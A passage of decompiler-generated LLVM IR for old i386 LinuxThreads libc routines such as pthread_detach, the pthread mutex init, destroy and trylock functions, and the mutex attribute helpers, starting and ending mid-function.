  br i1 %v11_8059b32, label %dec_label_pc_8059b2d.dec_label_pc_8059b11_crit_edge, label %dec_label_pc_8059b2d.dec_label_pc_8059b37.loopexit_crit_edge

dec_label_pc_8059b2d.dec_label_pc_8059b37.loopexit_crit_edge: ; preds = %dec_label_pc_8059b2d
  br label %dec_label_pc_8059b37

dec_label_pc_8059b2d.dec_label_pc_8059b11_crit_edge: ; preds = %dec_label_pc_8059b2d
  %v0_8059b1c.pre = load i32, i32* @global_var_8074524.624, align 4
  br label %dec_label_pc_8059b11

dec_label_pc_8059b37:                             ; preds = %dec_label_pc_8059b11, %dec_label_pc_8059b2d.dec_label_pc_8059b37.loopexit_crit_edge, %dec_label_pc_8059ae5
  br label %dec_label_pc_8059b39

dec_label_pc_8059b39:                             ; preds = %dec_label_pc_80599df, %dec_label_pc_8059b37
  %v0_8059b43 = phi i32 [ %v0_8059b434, %dec_label_pc_80599df ], [ 0, %dec_label_pc_8059b37 ]
  ret i32 %v0_8059b43

; uselistorder directives
  uselistorder i32 %v0_8059b1c, { 1, 0 }
  uselistorder i32 %v3_80599aa, { 3, 2, 4, 1, 0, 5, 6, 7 }
  uselistorder i32 %v0_80599aa, { 3, 2, 5, 4, 1, 0, 6 }
  uselistorder i32 %v2_8059967, { 10, 4, 3, 5, 7, 6, 1, 2, 9, 8, 0, 11 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-204, { 1, 2, 3, 0, 4, 5, 6, 7, 8 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0 }
  uselistorder i32 (i32, i32)* @__pthread_do_exit, { 2, 1, 4, 9, 8, 0, 7, 3, 11, 6, 5, 10 }
  uselistorder i32 440, { 6, 5, 0, 1, 2, 3, 4 }
  uselistorder i32 ()* @suspend.17, { 1, 0 }
  uselistorder i32 ()* @__pthread_set_own_extricate_if.15, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8059b39, { 1, 0 }
  uselistorder label %dec_label_pc_8059b37, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8059ae5, { 1, 0 }
  uselistorder label %dec_label_pc_8059acf, { 1, 0 }
  uselistorder label %dec_label_pc_8059ac1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8059ab0, { 1, 0 }
  uselistorder label %dec_label_pc_8059a4b, { 1, 0 }
  uselistorder label %dec_label_pc_80599df, { 0, 2, 1 }
}

define i32 @pthread_detach(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %v0_8059b46 = load i32, i32* @ebx, align 4
  store i32 0, i32* @edx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8059b58 = urem i32 %arg1, 1024
  %v2_8059b5d = mul nuw nsw i32 %v1_8059b58, 16
  %v1_8059b60 = add i32 %v2_8059b5d, ptrtoint (i32* @global_var_8070140.628 to i32)
  store i32 %v1_8059b60, i32* @esi, align 4
  store i32 %v1_8059b60, i32* @eax, align 4
  %v1_8059b68 = call i32 @__pthread_lock(i32 %v0_8059b46)
  %v0_8059b6d = load i32, i32* @esi, align 4
  %v1_8059b6d = add i32 %v0_8059b6d, 8
  %v2_8059b6d = inttoptr i32 %v1_8059b6d to i32*
  %v3_8059b6d = load i32, i32* %v2_8059b6d, align 4
  %v1_8059b70 = icmp eq i32 %v3_8059b6d, 0
  br i1 %v1_8059b70, label %dec_label_pc_8059b79, label %dec_label_pc_8059b74

dec_label_pc_8059b74:                             ; preds = %entry
  %v1_8059b74 = add i32 %v3_8059b6d, 16
  %v2_8059b74 = inttoptr i32 %v1_8059b74 to i32*
  %v3_8059b74 = load i32, i32* %v2_8059b74, align 4
  %v4_8059b74 = load i32, i32* @edi, align 4
  %v15_8059b74 = icmp eq i32 %v3_8059b74, %v4_8059b74
  br i1 %v15_8059b74, label %dec_label_pc_8059b89, label %dec_label_pc_8059b79

dec_label_pc_8059b79:                             ; preds = %dec_label_pc_8059b74, %entry
  store i32 %v0_8059b6d, i32* %stack_var_-188, align 4
  %v1_8059b7d = inttoptr i32 %v0_8059b6d to i32*
  %v2_8059b7d = call i32 @__pthread_unlock(i32* %v1_8059b7d)
  br label %dec_label_pc_8059b9d

dec_label_pc_8059b89:                             ; preds = %dec_label_pc_8059b74
  %v1_8059b89 = add i32 %v3_8059b6d, 45
  %v2_8059b89 = inttoptr i32 %v1_8059b89 to i8*
  %v3_8059b89 = load i8, i8* %v2_8059b89, align 1
  %v4_8059b89 = icmp eq i8 %v3_8059b89, 0
  br i1 %v4_8059b89, label %dec_label_pc_8059ba2, label %dec_label_pc_8059b8f

dec_label_pc_8059b8f:                             ; preds = %dec_label_pc_8059b89
  store i32 %v0_8059b6d, i32* %stack_var_-188, align 4
  %v1_8059b93 = inttoptr i32 %v0_8059b6d to i32*
  %v2_8059b93 = call i32 @__pthread_unlock(i32* %v1_8059b93)
  br label %dec_label_pc_8059b9d

dec_label_pc_8059b9d:                             ; preds = %dec_label_pc_8059ba8, %dec_label_pc_8059b79, %dec_label_pc_8059b8f
  %v0_8059c1c3 = phi i32 [ 0, %dec_label_pc_8059ba8 ], [ 3, %dec_label_pc_8059b79 ], [ 22, %dec_label_pc_8059b8f ]
  br label %dec_label_pc_8059c13

dec_label_pc_8059ba2:                             ; preds = %dec_label_pc_8059b89
  %v1_8059ba2 = add i32 %v3_8059b6d, 56
  %v2_8059ba2 = inttoptr i32 %v1_8059ba2 to i32*
  %v3_8059ba2 = load i32, i32* %v2_8059ba2, align 4
  %v4_8059ba2 = icmp eq i32 %v3_8059ba2, 0
  br i1 %v4_8059ba2, label %dec_label_pc_8059bb5, label %dec_label_pc_8059ba8

dec_label_pc_8059ba8:                             ; preds = %dec_label_pc_8059ba2
  store i32 %v0_8059b6d, i32* %stack_var_-188, align 4
  %v1_8059bac = inttoptr i32 %v0_8059b6d to i32*
  %v2_8059bac = call i32 @__pthread_unlock(i32* %v1_8059bac)
  br label %dec_label_pc_8059b9d

dec_label_pc_8059bb5:                             ; preds = %dec_label_pc_8059ba2
  store i8 1, i8* %v2_8059b89, align 1
  %v1_8059bbc = add i32 %v3_8059b6d, 44
  %v2_8059bbc = inttoptr i32 %v1_8059bbc to i8*
  %v3_8059bbc = load i8, i8* %v2_8059bbc, align 1
  %v4_8059bbc = sext i8 %v3_8059bbc to i32
  store i32 %v4_8059bbc, i32* @ebx, align 4
  %v0_8059bc0 = load i32, i32* @esi, align 4
  store i32 %v0_8059bc0, i32* %stack_var_-188, align 4
  %v1_8059bc1 = inttoptr i32 %v0_8059bc0 to i32*
  %v2_8059bc1 = call i32 @__pthread_unlock(i32* %v1_8059bc1)
  %v1_8059bc9 = icmp eq i8 %v3_8059bbc, 0
  br i1 %v1_8059bc9, label %dec_label_pc_8059c11, label %dec_label_pc_8059bcd

dec_label_pc_8059bcd:                             ; preds = %dec_label_pc_8059bb5
  %v0_8059bcd = load i32, i32* @global_var_8074524.624, align 4
  %v2_8059bcd = icmp slt i32 %v0_8059bcd, 0
  br i1 %v2_8059bcd, label %dec_label_pc_8059c11, label %dec_label_pc_8059bd6

dec_label_pc_8059bd6:                             ; preds = %dec_label_pc_8059bcd
  %v0_8059bd6 = load i32, i32* %stack_var_-188, align 4
  %v1_8059bd6 = load i32, i32* %stack_var_-184, align 4
  %v2_8059bd6 = call i32 @thread_self.16(i32 %v0_8059bd6, i32 %v1_8059bd6)
  store i32 %v2_8059bd6, i32* %stack_var_-160, align 4
  %v2_8059beb = ptrtoint i32* %stack_var_-160 to i32
  br label %dec_label_pc_8059beb

dec_label_pc_8059beb:                             ; preds = %dec_label_pc_8059c07, %dec_label_pc_8059bd6
  store i32 %v2_8059beb, i32* %stack_var_-184, align 4
  %v0_8059bf6 = load i32, i32* @global_var_8074524.624, align 4
  store i32 %v0_8059bf6, i32* %stack_var_-188, align 4
  %v3_8059bfc = call i32 @__libc_write(i32 %v0_8059bf6, i32 %v2_8059beb, i32 148)
  %v8_8059c04 = icmp eq i32 %v3_8059bfc, -1
  %v1_8059c05 = icmp eq i1 %v8_8059c04, false
  br i1 %v1_8059c05, label %dec_label_pc_8059c11, label %dec_label_pc_8059c07

dec_label_pc_8059c07:                             ; preds = %dec_label_pc_8059beb
  %v0_8059c07 = load i32, i32* %stack_var_-188, align 4
  %v1_8059c07 = call i32 @__errno_location(i32 %v0_8059c07)
  %v1_8059c0c = inttoptr i32 %v1_8059c07 to i32*
  %v2_8059c0c = load i32, i32* %v1_8059c0c, align 4
  %v11_8059c0c = icmp eq i32 %v2_8059c0c, 4
  br i1 %v11_8059c0c, label %dec_label_pc_8059beb, label %dec_label_pc_8059c07.dec_label_pc_8059c11.loopexit_crit_edge

dec_label_pc_8059c07.dec_label_pc_8059c11.loopexit_crit_edge: ; preds = %dec_label_pc_8059c07
  br label %dec_label_pc_8059c11

dec_label_pc_8059c11:                             ; preds = %dec_label_pc_8059beb, %dec_label_pc_8059c07.dec_label_pc_8059c11.loopexit_crit_edge, %dec_label_pc_8059bcd, %dec_label_pc_8059bb5
  br label %dec_label_pc_8059c13

dec_label_pc_8059c13:                             ; preds = %dec_label_pc_8059b9d, %dec_label_pc_8059c11
  %v0_8059c1c = phi i32 [ %v0_8059c1c3, %dec_label_pc_8059b9d ], [ 0, %dec_label_pc_8059c11 ]
  ret i32 %v0_8059c1c

; uselistorder directives
  uselistorder i32 %v3_8059b6d, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_8059b6d, { 3, 2, 5, 4, 1, 0, 6 }
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %stack_var_-160, { 1, 0 }
  uselistorder i32 (i32, i32)* @thread_self.16, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8059c13, { 1, 0 }
  uselistorder label %dec_label_pc_8059c11, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8059b9d, { 0, 2, 1 }
}

define i32 @__fresetlockfiles() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_8059c24 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_8059c24, i32* %ebx.global-to-local, align 4
  %v2_8059c29 = call i32 @pthread_mutexattr_init(i32* nonnull %stack_var_-8)
  %v3_8059c33 = call i32 @__pthread_mutexattr_setkind_np(i32* nonnull %stack_var_-8, i32 1)
  %storemerge8 = load i32, i32* bitcast (i32** @global_var_807461c.665 to i32*), align 4
  store i32 %storemerge8, i32* %ebx.global-to-local, align 4
  %v1_8059c529 = icmp eq i32 %storemerge8, 0
  %v1_8059c5810 = icmp eq i1 %v1_8059c529, false
  br i1 %v1_8059c5810, label %dec_label_pc_8059c40, label %dec_label_pc_8059c5a

dec_label_pc_8059c40:                             ; preds = %entry, %dec_label_pc_8059c40
  %storemerge11 = phi i32 [ %storemerge, %dec_label_pc_8059c40 ], [ %storemerge8, %entry ]
  %v1_8059c43 = add i32 %storemerge11, 56
  %v3_8059c47 = call i32 @pthread_mutex_init(i32 %v1_8059c43, i32* nonnull %stack_var_-8)
  %v0_8059c4c = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059c4c = add i32 %v0_8059c4c, 32
  %v2_8059c4c = inttoptr i32 %v1_8059c4c to i32*
  %storemerge = load i32, i32* %v2_8059c4c, align 4
  store i32 %storemerge, i32* %ebx.global-to-local, align 4
  %v1_8059c52 = icmp eq i32 %storemerge, 0
  %v1_8059c58 = icmp eq i1 %v1_8059c52, false
  br i1 %v1_8059c58, label %dec_label_pc_8059c40, label %dec_label_pc_8059c5a

dec_label_pc_8059c5a:                             ; preds = %dec_label_pc_8059c40, %entry
  %v1_8059c5e = call i32 @pthread_mutexattr_destroy(i32 %v2_8059c24)
  ret i32 %v1_8059c5e

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32 (i32)* @pthread_mutexattr_destroy, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8059c40, { 1, 0 }
}

define i32 @__pthread_trylock(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8059c68 = load i32, i32* @ebx, align 4
  store i32 %v0_8059c68, i32* %stack_var_-4, align 4
  %v0_8059c69 = load i32, i32* @eax, align 4
  store i32 %v0_8059c69, i32* %ecx.global-to-local, align 4
  %v1_8059c6e10 = inttoptr i32 %v0_8059c69 to i32*
  %v2_8059c6e11 = load i32, i32* %v1_8059c6e10, align 4
  %v3_8059c6e12 = icmp eq i32 %v2_8059c6e11, 0
  br i1 %v3_8059c6e12, label %dec_label_pc_8059c7a, label %dec_label_pc_8059c90

dec_label_pc_8059c7a:                             ; preds = %entry, %dec_label_pc_8059c7a.dec_label_pc_8059c6e_crit_edge
  %v1_8059c6e13 = phi i32* [ %v1_8059c6e, %dec_label_pc_8059c7a.dec_label_pc_8059c6e_crit_edge ], [ %v1_8059c6e10, %entry ]
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_8059c83 = load i32, i32* %v1_8059c6e13, align 4
  %v15_8059c83 = icmp eq i32 %v2_8059c83, 0
  %v22_8059c83 = select i1 %v15_8059c83, i32 1, i32 %v2_8059c83
  store i32 %v22_8059c83, i32* %v1_8059c6e13, align 4
  %v1_8059c87 = zext i1 %v15_8059c83 to i32
  %v2_8059c87 = load i32, i32* %edx.global-to-local, align 4
  %v3_8059c87 = and i32 %v2_8059c87, -256
  %v4_8059c87 = or i32 %v3_8059c87, %v1_8059c87
  store i32 %v4_8059c87, i32* %edx.global-to-local, align 4
  %v4_8059c8a = icmp eq i1 %v15_8059c83, false
  br i1 %v4_8059c8a, label %dec_label_pc_8059c7a.dec_label_pc_8059c6e_crit_edge, label %dec_label_pc_8059c8e

dec_label_pc_8059c7a.dec_label_pc_8059c6e_crit_edge: ; preds = %dec_label_pc_8059c7a
  %v0_8059c6e.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_8059c6e = inttoptr i32 %v0_8059c6e.pre to i32*
  %v2_8059c6e = load i32, i32* %v1_8059c6e, align 4
  %v3_8059c6e = icmp eq i32 %v2_8059c6e, 0
  br i1 %v3_8059c6e, label %dec_label_pc_8059c7a, label %dec_label_pc_8059c90

dec_label_pc_8059c8e:                             ; preds = %dec_label_pc_8059c7a
  br label %dec_label_pc_8059c90

dec_label_pc_8059c90:                             ; preds = %entry, %dec_label_pc_8059c7a.dec_label_pc_8059c6e_crit_edge, %dec_label_pc_8059c8e
  %storemerge = phi i32 [ 0, %dec_label_pc_8059c8e ], [ 16, %dec_label_pc_8059c7a.dec_label_pc_8059c6e_crit_edge ], [ 16, %entry ]
  %v2_8059c90 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8059c90, i32* @edx, align 4
  %v2_8059c91 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8059c91, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %v1_8059c6e, { 1, 0 }
  uselistorder i1 %v15_8059c83, { 1, 0, 2 }
  uselistorder i32 %v2_8059c83, { 1, 0 }
  uselistorder i32* %v1_8059c6e13, { 1, 0 }
  uselistorder label %dec_label_pc_8059c90, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8059c7a, { 1, 0 }
}

define i32 @__pthread_alt_trylock(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8059c93 = load i32, i32* @ebx, align 4
  store i32 %v0_8059c93, i32* %stack_var_-4, align 4
  %v0_8059c94 = load i32, i32* @eax, align 4
  store i32 %v0_8059c94, i32* %ecx.global-to-local, align 4
  %v1_8059c9910 = inttoptr i32 %v0_8059c94 to i32*
  %v2_8059c9911 = load i32, i32* %v1_8059c9910, align 4
  %v3_8059c9912 = icmp eq i32 %v2_8059c9911, 0
  br i1 %v3_8059c9912, label %dec_label_pc_8059ca5, label %dec_label_pc_8059cbb

dec_label_pc_8059ca5:                             ; preds = %entry, %dec_label_pc_8059ca5.dec_label_pc_8059c99_crit_edge
  %v1_8059c9913 = phi i32* [ %v1_8059c99, %dec_label_pc_8059ca5.dec_label_pc_8059c99_crit_edge ], [ %v1_8059c9910, %entry ]
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_8059cae = load i32, i32* %v1_8059c9913, align 4
  %v15_8059cae = icmp eq i32 %v2_8059cae, 0
  %v22_8059cae = select i1 %v15_8059cae, i32 1, i32 %v2_8059cae
  store i32 %v22_8059cae, i32* %v1_8059c9913, align 4
  %v1_8059cb2 = zext i1 %v15_8059cae to i32
  %v2_8059cb2 = load i32, i32* %edx.global-to-local, align 4
  %v3_8059cb2 = and i32 %v2_8059cb2, -256
  %v4_8059cb2 = or i32 %v3_8059cb2, %v1_8059cb2
  store i32 %v4_8059cb2, i32* @edx, align 4
  %v4_8059cb5 = icmp eq i1 %v15_8059cae, false
  br i1 %v4_8059cb5, label %dec_label_pc_8059ca5.dec_label_pc_8059c99_crit_edge, label %dec_label_pc_8059cb9

dec_label_pc_8059ca5.dec_label_pc_8059c99_crit_edge: ; preds = %dec_label_pc_8059ca5
  %v0_8059c99.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_8059c99 = inttoptr i32 %v0_8059c99.pre to i32*
  %v2_8059c99 = load i32, i32* %v1_8059c99, align 4
  %v3_8059c99 = icmp eq i32 %v2_8059c99, 0
  br i1 %v3_8059c99, label %dec_label_pc_8059ca5, label %dec_label_pc_8059cbb

dec_label_pc_8059cb9:                             ; preds = %dec_label_pc_8059ca5
  br label %dec_label_pc_8059cbb

dec_label_pc_8059cbb:                             ; preds = %entry, %dec_label_pc_8059ca5.dec_label_pc_8059c99_crit_edge, %dec_label_pc_8059cb9
  %storemerge = phi i32 [ 0, %dec_label_pc_8059cb9 ], [ 16, %dec_label_pc_8059ca5.dec_label_pc_8059c99_crit_edge ], [ 16, %entry ]
  %v2_8059cbb = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8059cbb, i32* %ecx.global-to-local, align 4
  %v2_8059cbc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8059cbc, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %v1_8059c99, { 1, 0 }
  uselistorder i1 %v15_8059cae, { 1, 0, 2 }
  uselistorder i32 %v2_8059cae, { 1, 0 }
  uselistorder i32* %v1_8059c9913, { 1, 0 }
  uselistorder label %dec_label_pc_8059cbb, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8059ca5, { 1, 0 }
}

define i32 @pthread_mutex_init(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp2 = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  store i32 %tmp2, i32* @ecx, align 4
  store i32 3, i32* %edx.global-to-local, align 4
  %v1_8059ccb = icmp eq i32* %arg2, null
  %v1_8059ccd = add i32 %arg1, 16
  %v2_8059ccd = inttoptr i32 %v1_8059ccd to i32*
  store i32 0, i32* %v2_8059ccd, align 4
  %v0_8059cd4 = load i32, i32* %eax.global-to-local, align 4
  %v1_8059cd4 = add i32 %v0_8059cd4, 20
  %v2_8059cd4 = inttoptr i32 %v1_8059cd4 to i32*
  store i32 0, i32* %v2_8059cd4, align 4
  br i1 %v1_8059ccb, label %entry.dec_label_pc_8059cdf_crit_edge, label %dec_label_pc_8059cdd

entry.dec_label_pc_8059cdf_crit_edge:             ; preds = %entry
  %v0_8059cdf.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8059cdf

dec_label_pc_8059cdd:                             ; preds = %entry
  %v2_8059cdd = load i32, i32* %arg2, align 4
  store i32 %v2_8059cdd, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8059cdf

dec_label_pc_8059cdf:                             ; preds = %entry.dec_label_pc_8059cdf_crit_edge, %dec_label_pc_8059cdd
  %v0_8059cdf = phi i32 [ %v0_8059cdf.pre, %entry.dec_label_pc_8059cdf_crit_edge ], [ %v2_8059cdd, %dec_label_pc_8059cdd ]
  %v1_8059cdf = load i32, i32* %eax.global-to-local, align 4
  %v2_8059cdf = add i32 %v1_8059cdf, 12
  %v3_8059cdf = inttoptr i32 %v2_8059cdf to i32*
  store i32 %v0_8059cdf, i32* %v3_8059cdf, align 4
  %v0_8059ce2 = load i32, i32* %eax.global-to-local, align 4
  %v1_8059ce2 = add i32 %v0_8059ce2, 4
  %v2_8059ce2 = inttoptr i32 %v1_8059ce2 to i32*
  store i32 0, i32* %v2_8059ce2, align 4
  %v0_8059ce9 = load i32, i32* %eax.global-to-local, align 4
  %v1_8059ce9 = add i32 %v0_8059ce9, 8
  %v2_8059ce9 = inttoptr i32 %v1_8059ce9 to i32*
  store i32 0, i32* %v2_8059ce9, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_8059cdf, { 1, 0 }
}

define i32 @pthread_mutex_destroy(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8059cf7 = add i32 %arg1, 12
  %v2_8059cf7 = inttoptr i32 %v1_8059cf7 to i32*
  %v3_8059cf7 = load i32, i32* %v2_8059cf7, align 4
  %v2_8059cfa = icmp slt i32 %v3_8059cf7, 0
  br i1 %v2_8059cfa, label %dec_label_pc_8059d08, label %dec_label_pc_8059cfe

dec_label_pc_8059cfe:                             ; preds = %entry
  %v7_8059d01 = icmp sgt i32 %v3_8059cf7, 1
  br i1 %v7_8059d01, label %dec_label_pc_8059d03, label %dec_label_pc_8059d0e

dec_label_pc_8059d03:                             ; preds = %dec_label_pc_8059cfe
  %v7_8059d06 = icmp sgt i32 %v3_8059cf7, 3
  br i1 %v7_8059d06, label %dec_label_pc_8059d08, label %dec_label_pc_8059d18

dec_label_pc_8059d08:                             ; preds = %dec_label_pc_8059d03, %entry
  ret i32 22

dec_label_pc_8059d0e:                             ; preds = %dec_label_pc_8059cfe
  %v1_8059d0e = add i32 %arg1, 16
  %v2_8059d0e = inttoptr i32 %v1_8059d0e to i8*
  %v3_8059d0e = load i8, i8* %v2_8059d0e, align 1
  %v4_8059d0e = urem i8 %v3_8059d0e, 2
  %v5_8059d0e = icmp eq i8 %v4_8059d0e, 0
  br i1 %v5_8059d0e, label %dec_label_pc_8059d20, label %dec_label_pc_8059d1a

dec_label_pc_8059d18:                             ; preds = %dec_label_pc_8059d03
  %v1_8059d14 = add i32 %arg1, 16
  %v2_8059d14 = inttoptr i32 %v1_8059d14 to i32*
  %v3_8059d14 = load i32, i32* %v2_8059d14, align 4
  %v4_8059d14 = icmp eq i32 %v3_8059d14, 0
  br i1 %v4_8059d14, label %dec_label_pc_8059d20, label %dec_label_pc_8059d1a

dec_label_pc_8059d1a:                             ; preds = %dec_label_pc_8059d0e, %dec_label_pc_8059d18
  ret i32 16

dec_label_pc_8059d20:                             ; preds = %dec_label_pc_8059d0e, %dec_label_pc_8059d18
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_8059d20, { 1, 0 }
  uselistorder label %dec_label_pc_8059d1a, { 1, 0 }
}

define i32 @pthread_mutexattr_init(i32* %arg1) local_unnamed_addr {
entry:
  store i32 3, i32* %arg1, align 4
  ret i32 0
}

define i32 @pthread_mutexattr_destroy(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutexattr_setkind_np(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v6_8059d3f = icmp ugt i32 %arg2, 3
  br i1 %v6_8059d3f, label %dec_label_pc_8059d49, label %dec_label_pc_8059d41

dec_label_pc_8059d41:                             ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_8059d49

dec_label_pc_8059d49:                             ; preds = %entry, %dec_label_pc_8059d41
  %v0_8059d49 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_8059d41 ]
  ret i32 %v0_8059d49

; uselistorder directives
  uselistorder label %dec_label_pc_8059d49, { 1, 0 }
}

define i32 @__pthread_mutexattr_gettype(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_8059d4e = load i32, i32* %arg1, align 4
  %v2_8059d54 = inttoptr i32 %arg2 to i32*
  store i32 %v2_8059d4e, i32* %v2_8059d54, align 4
  ret i32 0
}

define i32 @__pthread_mutexattr_getpshared(i32* %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* %arg1, align 4
  ret i32 0
}

define i32 @__pthread_mutexattr_setpshared(i32 %arg1) local_unnamed_addr {
entry:
  %tmp2 = or i32 %arg1, 1
  %tmp3 = icmp eq i32 %tmp2, 1
  br i1 %tmp3, label %dec_label_pc_8059d74, label %dec_label_pc_8059d7b

dec_label_pc_8059d74:                             ; preds = %entry
  br label %dec_label_pc_8059d7b

dec_label_pc_8059d7b:                             ; preds = %entry, %dec_label_pc_8059d74
  %v0_8059d7b = phi i32 [ 22, %entry ], [ 38, %dec_label_pc_8059d74 ]
  ret i32 %v0_8059d7b

; uselistorder directives
  uselistorder label %dec_label_pc_8059d7b, { 1, 0 }
}

define i32 @__pthread_once_fork_child() local_unnamed_addr {
entry:
  %v3_8059d86 = call i32 @pthread_mutex_init(i32 ptrtoint (i32* @global_var_8078e88.676 to i32), i32* null)
  %v3_8059d92 = call i32 @pthread_cond_init(i32* nonnull @global_var_8078ea0.677, i32 0)
  %v0_8059d97 = load i32, i32* @global_var_8078eac.678, align 4
  %v1_8059d9f = add i32 %v0_8059d97, -2147483643
  %v6_8059d9f = sub i32 2147483642, %v0_8059d97
  %v7_8059d9f = and i32 %v6_8059d9f, %v0_8059d97
  %v8_8059d9f = icmp slt i32 %v7_8059d9f, 0
  %v9_8059d9f = icmp eq i32 %v1_8059d9f, 0
  %v10_8059d9f = icmp slt i32 %v1_8059d9f, 0
  %v3_8059da4 = icmp eq i1 %v10_8059d9f, %v8_8059d9f
  %v4_8059da4 = icmp eq i1 %v9_8059d9f, false
  %v5_8059da4 = and i1 %v4_8059da4, %v3_8059da4
  br i1 %v5_8059da4, label %dec_label_pc_8059dba, label %dec_label_pc_8059da6

dec_label_pc_8059da6:                             ; preds = %entry
  %v1_8059da6 = add i32 %v0_8059d97, 4
  br label %dec_label_pc_8059dba

dec_label_pc_8059dba:                             ; preds = %entry, %dec_label_pc_8059da6
  %storemerge = phi i32 [ %v1_8059da6, %dec_label_pc_8059da6 ], [ 0, %entry ]
  %v0_8059dbd = phi i32 [ %v1_8059da6, %dec_label_pc_8059da6 ], [ %v0_8059d97, %entry ]
  store i32 %storemerge, i32* @global_var_8078eac.678, align 4
  ret i32 %v0_8059dbd

; uselistorder directives
  uselistorder i32 %v1_8059d9f, { 1, 0 }
  uselistorder i32 %v0_8059d97, { 1, 2, 0, 4, 3 }
  uselistorder label %dec_label_pc_8059dba, { 1, 0 }
}

define i32 @thread_self.18(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %stack_var_2097151 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8059dbe = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8059dbe, i32* @edx, align 4
  %v0_8059dc5 = load i32, i32* @esp, align 4
  %v1_8059dc5 = load i32, i32* @global_var_8078e6c.615, align 4
  %v7_8059dc5 = icmp ult i32 %v0_8059dc5, %v1_8059dc5
  %v1_8059dcb = icmp eq i1 %v7_8059dc5, false
  br i1 %v1_8059dcb, label %dec_label_pc_8059dfc, label %dec_label_pc_8059dcd

dec_label_pc_8059dcd:                             ; preds = %entry
  %v1_8059dcd = load i32, i32* @global_var_8078e70.616, align 16
  %v7_8059dcd = icmp ult i32 %v0_8059dc5, %v1_8059dcd
  br i1 %v7_8059dcd, label %dec_label_pc_8059de2, label %dec_label_pc_8059dd5

dec_label_pc_8059dd5:                             ; preds = %dec_label_pc_8059dcd
  %v1_8059dda = load i32, i32* @global_var_8078e74.618, align 4
  %v7_8059dda = icmp ult i32 %v0_8059dc5, %v1_8059dda
  br i1 %v7_8059dda, label %dec_label_pc_8059dfc, label %dec_label_pc_8059de2

dec_label_pc_8059de2:                             ; preds = %dec_label_pc_8059dd5, %dec_label_pc_8059dcd
  %v0_8059de2 = load i32, i32* @global_var_807e578.619, align 8
  %v1_8059de2 = icmp eq i32 %v0_8059de2, 0
  br i1 %v1_8059de2, label %dec_label_pc_8059df0, label %dec_label_pc_8059deb

dec_label_pc_8059deb:                             ; preds = %dec_label_pc_8059de2
  %v0_8059deb = call i32 @__pthread_find_self()
  br label %dec_label_pc_8059df0

dec_label_pc_8059df0:                             ; preds = %dec_label_pc_8059de2, %dec_label_pc_8059deb
  %v3_8059df0 = ptrtoint i32* %stack_var_2097151 to i32
  store i32 %v3_8059df0, i32* @edx, align 4
  %v2_8059df6 = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_8059dfc

dec_label_pc_8059dfc:                             ; preds = %dec_label_pc_8059dd5, %entry, %dec_label_pc_8059df0
